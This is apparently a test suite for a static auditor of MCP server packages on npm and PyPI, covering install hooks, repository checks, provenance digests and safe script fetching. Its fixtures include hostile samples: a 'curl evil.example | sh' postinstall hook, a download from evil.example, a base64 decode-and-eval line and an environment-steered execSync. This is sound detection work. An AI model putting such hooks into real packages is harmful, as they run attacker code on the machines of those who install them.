import { test } from 'node:test'
import assert from 'node:assert/strict'
import { auditPackage, auditPypiPackage, auditRegistryServer, registryProvenance, fetchHookScript, fetchNpmDocument, defaultHttp, summarize, renderMarkdown, newestPerServer, hookScriptRefs, stripStringsAndComments, criticalPatternOf } from '../mcp-audit.mjs'

const server = {
  name: 'acme/server',
  version: '1.0.0',
  packages: [{ registryType: 'npm', identifier: 'acme-mcp', version: '1.0.0', transport: { type: 'stdio' } }],
  repository: { url: 'https://github.com/acme/server' },
}

test('auditPackage flags install-time execution and a shell pipeline', () => {
  const doc = {
    'dist-tags': { latest: '1.1.0' },
    versions: {
      '1.0.0': {
        scripts: { postinstall: 'curl -fsSL https://evil.example/x | sh' },
        repository: { url: 'git+https://github.com/other/repo.git' },
        dependencies: { execa: '^9.0.0' },
      },
    },
  }
  const findings = auditPackage(server, doc, { version: '1.0.0' })
  const rules = findings.map((f) => f.rule)
  assert.ok(rules.includes('stdio-transport'))
  assert.ok(rules.includes('install-time-execution'))
  assert.ok(rules.includes('install-hook-critical'))
  assert.ok(rules.includes('repository-mismatch'))
  assert.ok(rules.includes('declared-version-not-latest'))
  assert.ok(rules.includes('process-spawn-dependency'))
  const critical = findings.find((f) => f.rule === 'install-hook-critical')
  assert.equal(critical.severity, 'critical')
  assert.match(critical.evidence, /postinstall/)
})

test('auditPackage reports unknown instead of guessing when metadata is missing', () => {
  const findings = auditPackage(server, null, { version: '1.0.0' })
  assert.deepEqual(findings.map((f) => f.rule), ['stdio-transport', 'package-metadata-unavailable'])
  assert.equal(findings[1].severity, 'unknown')
})

test('a repository URL with a sub-path is the same repository', () => {
  const s = { name: 'acme/s', packages: [{ registryType: 'npm', identifier: 'acme-mcp', version: '1.0.0', transport: { type: 'stdio' } }], repository: { url: 'https://github.com/acme/server' } }
  const withRepo = (url) => ({ 'dist-tags': { latest: '1.0.0' }, versions: { '1.0.0': { repository: { url: url } } } })
  for (const url of ["https://github.com/acme/server/issues", "https://github.com/acme/server/blob/main/changelog.md", "git+https://github.com/acme/server.git"]) {
    assert.ok(!auditPackage(s, withRepo(url), { version: '1.0.0' }).some((f) => f.rule === 'repository-mismatch'), url + " is the same repository")
  }
  assert.ok(auditPackage(s, withRepo("https://github.com/acme/other"), { version: '1.0.0' }).some((f) => f.rule === 'repository-mismatch'), 'a genuinely different repository must still be flagged')
})

test('a registry repository that is an empty object names nothing', () => {
  // "repository": {} is truthy, so the truthiness test in front of this rule treated it as a
  // named repository: severity low instead of medium, and repoKey returned null which was then
  // concatenated into the message. One published record said the registry entry "points at null".
  const empty = { name: 'acme/s', packages: [{ registryType: 'npm', identifier: 'p', version: '1.0.0', transport: { type: 'stdio' } }], repository: {} }
  const meta = { 'dist-tags': { latest: '1.0.0' }, versions: { '1.0.0': {} } }
  const f = auditPackage(empty, meta, { version: '1.0.0' }).find((x) => x.rule === 'package-repository-missing')
  assert.equal(f.severity, 'medium', 'an empty object names nothing, so the source could not be located')
  assert.doesNotMatch(f.evidence, /null/, 'a message must never render a null repository')
  assert.match(f.evidence, /neither the registry entry nor the published package/)
})

test('a missing repository says which side is missing it', () => {
  // The registry entry naming a repository is not the same as the package naming one, and the
  // rule used to say "the registry document" for either case. A maintainer whose registry
  // entry points at their repo reads that as a false statement, and they are right.
  const meta = { 'dist-tags': { latest: '1.0.0' }, versions: { '1.0.0': {} } }
  const one = auditPackage(server, meta, { version: '1.0.0' }).find((f) => f.rule === 'package-repository-missing')
  assert.equal(one.severity, 'low')
  assert.match(one.evidence, /the published package declares no repository/)
  assert.match(one.evidence, /github\.com\/acme\/server/)

  const bare = { name: 'acme/bare', packages: [{ registryType: 'npm', identifier: 'bare-mcp', version: '1.0.0', transport: { type: 'stdio' } }] }
  const two = auditPackage(bare, meta, { version: '1.0.0' }).find((f) => f.rule === 'package-repository-missing')
  assert.equal(two.severity, 'medium', 'nothing names a repository, so the source could not be located')
  assert.match(two.evidence, /neither the registry entry nor the published package/)
})

test('auditPackage flags a missing repository and deprecation', () => {
  const doc = { 'dist-tags': { latest: '1.0.0' }, versions: { '1.0.0': {} }, deprecated: 'moved to acme/mcp' }
  const findings = auditPackage({ ...server, repository: null }, doc, { version: '1.0.0' })
  const rules = findings.map((f) => f.rule)
  assert.ok(rules.includes('package-repository-missing'))
  assert.ok(rules.includes('package-deprecated'))
})

test('summarize counts findings, coverage and audited packages', () => {
  const rows = [
    { server: 'a', package: 'a-mcp', registryType: 'npm', audited: true, findings: [{ rule: 'install-time-execution', severity: 'high' }] },
    { server: 'b', package: null, registryType: null, audited: false, findings: [] },
    { server: 'c', package: 'c-mcp', registryType: 'pypi', audited: false, findings: [{ rule: 'install-time-execution', severity: 'high' }] },
  ]
  const s = summarize(rows)
  assert.equal(s.servers.total, 3)
  assert.equal(s.servers.withFindings, 2)
  assert.equal(s.servers.withPackage, 2)
  assert.equal(s.servers.auditedNpm, 1)
  assert.equal(s.servers.notAuditedPackages, 1)
  assert.equal(s.servers.remoteOnly, 1)
  assert.equal(s.ruleCounts['install-time-execution'], 2)
})

test('renderMarkdown shows the rule table and high-severity rows', () => {
  const payload = {
    generatedAt: 'T',
    source: 'src',
    summary: summarize([
      { server: 'acme/server', package: 'acme-mcp', registryType: 'npm', audited: true, findings: [{ rule: 'install-script-shell-pipeline', severity: 'critical', evidence: 'scripts.postinstall=...' }] },
    ]),
    registry: { entries: 2, uniqueServers: 1, pages: 1, truncated: false },
    rows: [{ server: 'acme/server', package: 'acme-mcp', findings: [{ rule: 'install-script-shell-pipeline', severity: 'critical', evidence: 'scripts.postinstall=...' }] }],
  }
  const md = renderMarkdown(payload)
  assert.match(md, /Enumerated \*\*2\*\* registry entries covering \*\*1\*\* unique servers/)
  assert.match(md, /Audited: \*\*1\*\* npm and \*\*0\*\* PyPI packages/)
  assert.match(md, /install-script-shell-pipeline/)
  assert.match(md, /Static only/)
})
test('newestPerServer keeps the highest published version per name', () => {
  const servers = [
    { name: 'a/b', version: '1.0.0' },
    { name: 'a/b', version: '1.2.0' },
    { name: 'a/b', version: '1.1.9' },
    { name: 'c/d', version: '0.1.0' },
  ]
  const kept = newestPerServer(servers)
  assert.equal(kept.length, 2)
  assert.equal(kept.find((s) => s.name === 'a/b').version, '1.2.0')
})

test('auditPackage records one stdio finding even with several packages', () => {
  const server = { name: 'x/y', packages: [
    { registryType: 'npm', identifier: 'a', transport: { type: 'stdio' } },
    { registryType: 'npm', identifier: 'b', transport: { type: 'stdio' } },
  ] }
  const findings = auditPackage(server, null, {})
  assert.equal(findings.filter((f) => f.rule === 'stdio-transport').length, 1)
})

const pkg = (hook) => ({ 'dist-tags': { latest: '1.0.0' }, versions: { '1.0.0': { scripts: { postinstall: hook } } } })

test('a print-only node -e hook is not critical (v0 false positive)', () => {
  const findings = auditPackage(server, pkg("node -e \"console.log('installed')\""), { version: '1.0.0' })
  assert.ok(findings.some((f) => f.rule === 'install-time-execution'))
  assert.ok(!findings.some((f) => f.severity === 'critical'), JSON.stringify(findings))
})

test('a hook that only prints is listed, but is not install-time execution', () => {
  const banner = auditPackage(server, pkg("node -e \"require('fs').existsSync('dist/index.js')&&console.log('installed')\""), { version: '1.0.0' })
  assert.equal(banner.find((f) => f.rule === 'install-time-execution').severity, 'info')
  const echo = auditPackage(server, pkg("echo 'installed'"), { version: '1.0.0' })
  assert.equal(echo.find((f) => f.rule === 'install-time-execution').severity, 'info')
  const chained = auditPackage(server, pkg("echo hi && node setup.js"), { version: '1.0.0' })
  assert.equal(chained.find((f) => f.rule === 'install-time-execution').severity, 'high')
})

test('a hook that runs a program is install-time execution at high', () => {
  const findings = auditPackage(server, pkg('node scripts/postinstall.cjs'), { version: '1.0.0' })
  assert.equal(findings.find((f) => f.rule === 'install-time-execution').severity, 'high')
})

test('a hook that runs a script which only prints is listed, not execution', () => {
  const banner = "if (process.stdout.isTTY) { console.log('installed') }"
  const findings = auditPackage(server, pkg('node scripts/postinstall.cjs'), { version: '1.0.0' }, { 'scripts/postinstall.cjs': banner })
  const exec = findings.find((f) => f.rule === 'install-time-execution')
  assert.equal(exec.severity, 'info')
  assert.match(exec.evidence, /only prints/)
})

test('a hook that runs a script requiring a local module stays execution', () => {
  const script = "const { getBinaryPath } = require('./lib/main'); getBinaryPath()"
  const findings = auditPackage(server, pkg('node install.js'), { version: '1.0.0' }, { 'install.js': script })
  assert.equal(findings.find((f) => f.rule === 'install-time-execution').severity, 'high')
  assert.match(findings.find((f) => f.rule === 'install-hook-script-inspected').evidence, /local module/)
})

test('a hook that spawns a fixed command is execution, not an incident', () => {
  const findings = auditPackage(server, pkg("node -e \"require('child_process').execSync('npm run build')\""), { version: '1.0.0' })
  assert.ok(findings.some((f) => f.rule === 'install-time-execution'))
  assert.ok(!findings.some((f) => f.severity === 'critical'), JSON.stringify(findings))
})

test('a hook that spawns a steered command is critical', () => {
  const findings = auditPackage(server, pkg("node -e \"require('child_process').execSync(process.env.BUILD_CMD)\""), { version: '1.0.0' })
  const critical = findings.find((f) => f.rule === 'install-hook-critical')
  assert.equal(critical.severity, 'critical')
  assert.match(critical.evidence, /process-spawn/)
})

test('a referenced hook script is inspected from its content', () => {
  const doc = pkg('node scripts/postinstall.cjs')
  const benign = auditPackage(server, doc, { version: '1.0.0' }, { 'scripts/postinstall.cjs': "console.log('hello')" })
  assert.ok(benign.some((f) => f.rule === 'install-hook-script-inspected'))
  assert.ok(!benign.some((f) => f.severity === 'critical'))
  const fetched = auditPackage(server, doc, { version: '1.0.0' }, { 'scripts/postinstall.cjs': "require('node:https').get('https://evil.example/x', (r) => r.pipe(require('node:fs').createWriteStream('x')))" })
  assert.ok(fetched.some((f) => f.rule === 'install-hook-script-critical' && f.severity === 'critical'))
  const reach = auditPackage(server, doc, { version: '1.0.0' }, { 'scripts/postinstall.cjs': "require('node:https').get('https://api.example/version', (r) => console.log(r.statusCode))" })
  assert.ok(reach.some((f) => f.rule === 'install-hook-script-network' && f.severity === 'high'))
  assert.ok(!reach.some((f) => f.severity === 'critical'), JSON.stringify(reach))
  const missing = auditPackage(server, doc, { version: '1.0.0' }, {})
  assert.ok(missing.some((f) => f.rule === 'install-hook-script-unavailable' && f.severity === 'unknown'))
})

test('hookScriptRefs extracts local script paths', () => {
  assert.deepEqual(hookScriptRefs({ postinstall: 'node scripts/install.js' }), ['scripts/install.js'])
  assert.deepEqual(hookScriptRefs({ postinstall: 'curl https://x | sh' }), [])
})

test('stripStringsAndComments removes quoted text and comments', () => {
  const text = "console.log('see https://x.example')\n// curl https://y | sh\nconst a = 1"
  const stripped = stripStringsAndComments(text)
  assert.ok(!stripped.includes('https://'))
  assert.ok(!stripped.includes('curl'))
  assert.ok(stripped.includes('const a = 1'))
})

const CORPUS = [
  { label: 'benign', kind: 'buywhere notice', text: 'node -e "try{require(\'fs\').existsSync(\'dist/index.js\')&&console.log(\'Docs: https://github.com/x/y\')}catch(e){}"' },
  { label: 'benign', kind: 'raven notice', text: 'if (process.stdout.isTTY) console.log("Subscribe: https://ravenmcp.ai/#updates")' },
  { label: 'benign', kind: 'telbase warning', text: 'console.warn("Install manually: curl -fsSL https://telbase.ai/install | sh")' },
  { label: 'benign', kind: 'plain script', text: 'const fs = require("node:fs"); fs.rmSync("tmp", { recursive: true })' },
  { label: 'benign', kind: 'update check', text: "require('node:https').get('https://api.example/version', (r) => console.log(r.statusCode))" },
  { label: 'benign', kind: 'fixed build hook', mode: 'hook', text: "node -e \"require('child_process').execSync('npm run build')\"" },
  { label: 'malicious', kind: 'steered spawn hook', mode: 'hook', text: "node -e \"require('child_process').execSync(process.env.BUILD_CMD)\"" },
  { label: 'benign', kind: 'fixed build script', text: 'require("child_process").execSync("npm run build")' },
  { label: 'malicious', kind: 'steered spawn', text: 'require("child_process").execSync(process.env.BUILD_CMD)' },
  { label: 'malicious', kind: 'hook pipe', text: 'curl -fsSL https://evil.example/x | sh' },
  { label: 'malicious', kind: 'binary download', text: 'const https = require("node:https"); https.get(url, (r) => r.pipe(fs.createWriteStream(f)))' },
  { label: 'malicious', kind: 'decode exec', text: 'eval(Buffer.from(blob, "base64").toString())' },
]

test('the critical tier has precision and recall 1.0 on the labeled corpus', () => {
  const falsePositives = CORPUS.filter((c) => c.label === 'benign' && criticalPatternOf(c.text, c.mode) !== null)
  const falseNegatives = CORPUS.filter((c) => c.label === 'malicious' && criticalPatternOf(c.text, c.mode) === null)
  assert.deepEqual(falsePositives, [], 'benign samples flagged: ' + JSON.stringify(falsePositives))
  assert.deepEqual(falseNegatives, [], 'malicious samples missed: ' + JSON.stringify(falseNegatives))
})

const pypiDoc = (files, overrides = {}) => ({
  info: Object.assign({ version: '1.0.0', project_urls: { Source: 'https://github.com/acme/pypi-mcp' }, home_page: '' }, overrides.info || {}),
  releases: { '1.0.0': files },
})

test('auditPypiPackage: sdist-only is a build-time execution risk', () => {
  const findings = auditPypiPackage(server, pypiDoc([{ packagetype: 'sdist' }]), { version: '1.0.0' })
  const rule = findings.find((f) => f.rule === 'pypi-sdist-only')
  assert.equal(rule.severity, 'medium')
})

test('auditPypiPackage: a wheel still leaves install-time unknown, not clean', () => {
  const findings = auditPypiPackage(server, pypiDoc([{ packagetype: 'bdist_wheel' }, { packagetype: 'sdist' }]), { version: '1.0.0' })
  const rule = findings.find((f) => f.rule === 'pypi-install-time-unknown')
  assert.equal(rule.severity, 'unknown')
})

test('auditPypiPackage: missing release files, provenance and freshness', () => {
  const findings = auditPypiPackage(server, pypiDoc([], { info: { version: '2.0.0', project_urls: {}, home_page: '' } }), { version: '1.0.0' })
  const rules = findings.map((f) => f.rule)
  assert.ok(rules.includes('declared-version-not-found'))
  assert.ok(rules.includes('package-repository-missing'))
  assert.ok(rules.includes('declared-version-not-latest'))
})

test('auditPypiPackage: unavailable metadata is unknown, never clean', () => {
  const findings = auditPypiPackage(server, null, { version: '1.0.0' })
  assert.deepEqual(findings.map((f) => f.rule), ['package-metadata-unavailable'])
  assert.equal(findings[0].severity, 'unknown')
})

test('registry provenance changes when same-version hook bytes change but findings do not', () => {
  const doc = pkg('node install.js')
  doc.versions['1.0.0'].dist = { integrity: 'sha512-same-registry-claim' }
  const first = { 'install.js': "console.log('one')" }
  const second = { 'install.js': "console.log('two')" }
  assert.deepEqual(auditPackage(server, doc, { version: '1.0.0' }, first), auditPackage(server, doc, { version: '1.0.0' }, second))
  const a = registryProvenance(server, doc, first)
  const b = registryProvenance(server, doc, second)
  assert.equal(a.complete, true)
  assert.equal(b.complete, true)
  assert.notEqual(a.content.digest, b.content.digest)
  assert.notEqual(a.content.digest, doc.versions['1.0.0'].dist.integrity)
})

test('registry provenance binds server fields, exact manifest, version and missing script markers', () => {
  const doc = pkg('node install.js')
  const scripts = { 'install.js': "console.log('ok')" }
  const a = registryProvenance(server, doc, scripts)
  assert.notEqual(a.content.digest, registryProvenance({ ...server, description: 'changed' }, doc, scripts).content.digest)
  assert.notEqual(a.content.digest, registryProvenance(server, { ...doc, versions: { '1.0.0': { ...doc.versions['1.0.0'], dependencies: { x: '2' } } } }, scripts).content.digest)
  const missing = registryProvenance(server, doc, {})
  assert.equal(missing.complete, false)
  assert.notEqual(a.content.digest, missing.content.digest)
  assert.notEqual(registryProvenance(server, doc, { 'install.js': '' }).content.digest, missing.content.digest)
  assert.equal(registryProvenance(server, null).complete, false)
  assert.equal(registryProvenance(server, { versions: { '2.0.0': {} } }).complete, false)
  const version2 = { ...server, packages: [{ ...server.packages[0], version: '2.0.0' }] }
  assert.notEqual(a.content.digest, registryProvenance(version2, { versions: { '2.0.0': doc.versions['1.0.0'] } }, scripts).content.digest)
  assert.equal(registryProvenance({ ...server, packages: [{ registryType: 'pypi', identifier: 'p', version: '1.0.0' }] }, { info: { version: '1.0.0' } }).complete, false)
})

test('registry scan uses the package version when server document version differs', async () => {
  const mismatched = { ...server, version: '9.9.9' }
  const doc = pkg('node install.js')
  const requests = []
  const row = await auditRegistryServer(mismatched, { http: async (url) => {
    requests.push(url)
    if (url.startsWith('https://registry.npmjs.org/')) return { status: 200, text: JSON.stringify(doc) }
    return { status: 200, text: "console.log('ok')" }
  } })
  assert.equal(row.version, '1.0.0')
  assert.equal(row.serverVersion, '9.9.9')
  assert.equal(row.provenance.package.version, '1.0.0')
  assert.equal(row.provenance.complete, true)
  assert.equal(requests.length, 2)
  assert.ok(requests[1].includes('acme-mcp@1.0.0/install.js'))
})

test('missing exact version never falls back to latest or top-level scripts', async () => {
  const doc = { 'dist-tags': { latest: '2.0.0' }, scripts: { postinstall: 'node wrong.js' }, versions: { '2.0.0': { scripts: { postinstall: 'node latest.js' } } } }
  for (const version of ['1.0.0', 'latest', '^2.0.0', '~2.0.0', '', null]) {
    const declared = { ...server, packages: [{ ...server.packages[0], version }] }
    const requests = []
    const row = await auditRegistryServer(declared, { http: async (url) => { requests.push(url); return { status: 200, text: JSON.stringify(doc) } } })
    assert.equal(row.version, version)
    assert.equal(row.provenance.complete, false)
    assert.ok(row.findings.some((finding) => finding.rule === 'declared-version-not-found'))
    assert.ok(!row.findings.some((finding) => finding.rule === 'install-time-execution'))
    assert.equal(requests.length, 1, 'no script is fetched for another package version')
  }
})

test('mismatched manifest identity cannot become complete census evidence', async () => {
  for (const manifest of [{ name: 'acme-mcp', version: '2.0.0' }, { name: 'other-package', version: '1.0.0' }]) {
    const row = await auditRegistryServer(server, { http: async () => ({ status: 200, text: JSON.stringify({ versions: { '1.0.0': manifest } }) }) })
    assert.equal(row.provenance.complete, false)
    assert.ok(row.findings.some((finding) => finding.rule === 'declared-version-not-found'))
  }
})

test('failed metadata or script reads are incomplete, while a fetched empty script is content', async () => {
  const missingMetadata = await auditRegistryServer(server, { http: async () => ({ status: 404, text: '' }) })
  assert.equal(missingMetadata.provenance.complete, false)
  assert.ok(missingMetadata.findings.some((finding) => finding.rule === 'package-metadata-unavailable'))
  const doc = pkg('node install.js')
  for (const status of [404, 200]) {
    const row = await auditRegistryServer(server, { http: async (url) => url.startsWith('https://registry.npmjs.org/')
      ? { status: 200, text: JSON.stringify(doc) }
      : { status, text: '' } })
    assert.equal(row.provenance.complete, status === 200)
    assert.equal(row.findings.some((finding) => finding.rule === 'install-hook-script-unavailable'), status === 404)
  }
})

test('unsupported registries emit incomplete provenance without adding network reads', async () => {
  let calls = 0
  const row = await auditRegistryServer({ ...server, packages: [{ registryType: 'oci', identifier: 'acme/image', version: '1.0.0' }] }, {
    http: async () => { calls += 1; throw new Error('must not be called') },
  })
  assert.equal(calls, 0)
  assert.equal(row.audited, false)
  assert.equal(row.provenance.complete, false)
})

test('hook reads accept package-relative paths and scoped npm names', async () => {
  const requested = []
  const text = await fetchHookScript('@acme/server', '1.0.0', './scripts/a.js', async (url) => {
    requested.push(url)
    return { status: 200, url, text: 'console.log(1)' }
  })
  assert.equal(text, 'console.log(1)')
  assert.deepEqual(requested, ['https://unpkg.com/@acme/server@1.0.0/scripts/a.js'])
  assert.deepEqual(hookScriptRefs({ postinstall: 'node "./scripts/a.js"' }), ['./scripts/a.js'])
  const scopedServer = { ...server, packages: [{ ...server.packages[0], identifier: '@acme/server' }] }
  assert.equal(registryProvenance(scopedServer, pkg('node ./scripts/a.js'), { './scripts/a.js': text }).complete, true)
})

test('unsafe hook paths remain missing even when supplied content looks harmless', async () => {
  const paths = ['../other@2.0.0/install.js', '/tmp/install.js', '//evil.example/install.js', 'scripts/../install.js',
    'scripts/%2e%2e/install.js', '%2e%2e%2fother%402.0.0%2finstall.js', 'scripts/install.js?version=2',
    'scripts/install.js#other', String.raw`scripts\install.js`, 'C:/install.js', 'https://evil.example/install.js']
  let requests = 0
  for (const path of paths) {
    assert.equal(await fetchHookScript('acme-mcp', '1.0.0', path, async () => { requests += 1; return { status: 200, text: 'wrong' } }), null, path)
    const doc = pkg('node ' + path)
    assert.deepEqual(hookScriptRefs(doc.versions['1.0.0'].scripts), [path], 'keep unsafe input intact: ' + path)
    const supplied = { [path]: "console.log('ok')" }
    assert.equal(registryProvenance(server, doc, supplied).complete, false, path)
    const findings = auditPackage(server, doc, { version: '1.0.0' }, supplied)
    assert.ok(findings.some((finding) => finding.rule === 'install-hook-script-unavailable'), path)
    assert.ok(!findings.some((finding) => finding.rule === 'install-hook-script-inspected'), path)
    assert.equal(findings.find((finding) => finding.rule === 'install-time-execution').severity, 'high', path)
  }
  assert.equal(requests, 0)
})

test('invalid npm identifiers cannot produce network reads or complete provenance', async () => {
  let requests = 0
  const http = async () => { requests += 1; return { status: 200, text: '{}' } }
  for (const name of ['../other', '@acme/../other', 'acme/other', '/absolute', 'acme?other', 'acme#other', 'acme%2fother', String.raw`acme\other`]) {
    assert.equal(await fetchHookScript(name, '1.0.0', 'install.js', http), null, name)
    assert.equal(await fetchNpmDocument(name, http), null, name)
    const invalidServer = { ...server, packages: [{ ...server.packages[0], identifier: name }] }
    assert.equal(registryProvenance(invalidServer, pkg('node install.js'), { 'install.js': 'console.log(1)' }).complete, false, name)
    const row = await auditRegistryServer(invalidServer, { http })
    assert.equal(row.provenance.complete, false, name)
  }
  assert.equal(requests, 0)
})

test('CDN redirects cannot bind a different origin, package, version or path', async () => {
  for (const finalUrl of ['https://evil.example/acme-mcp@1.0.0/install.js', 'https://unpkg.com/other@1.0.0/install.js',
    'https://unpkg.com/acme-mcp@2.0.0/install.js', 'https://unpkg.com/acme-mcp@1.0.0/other.js',
    'https://unpkg.com/acme-mcp@1.0.0/install.js?raw=1']) {
    assert.equal(await fetchHookScript('acme-mcp', '1.0.0', 'install.js', async () => ({ status: 200, url: finalUrl, text: 'wrong' })), null)
  }
  assert.equal(await fetchHookScript('acme-mcp', '1.0.0', 'install.js', async (url) => ({ status: 200, url, text: 'same file' })), 'same file')
  assert.equal(await fetchHookScript('acme-mcp', '1.0.0', 'install.js', async () => ({ status: 200, text: 'offline mock' })), 'offline mock')
})

test('default HTTP exposes the final response URL for binding checks without a live request', async () => {
  const originalFetch = globalThis.fetch
  globalThis.fetch = async () => ({ status: 200, url: 'https://unpkg.com/other@2.0.0/install.js', text: async () => 'redirected' })
  try {
    const result = await defaultHttp('https://unpkg.com/acme-mcp@1.0.0/install.js')
    assert.equal(result.url, 'https://unpkg.com/other@2.0.0/install.js')
    assert.equal(await fetchHookScript('acme-mcp', '1.0.0', 'install.js'), null)
  } finally {
    globalThis.fetch = originalFetch
  }
})
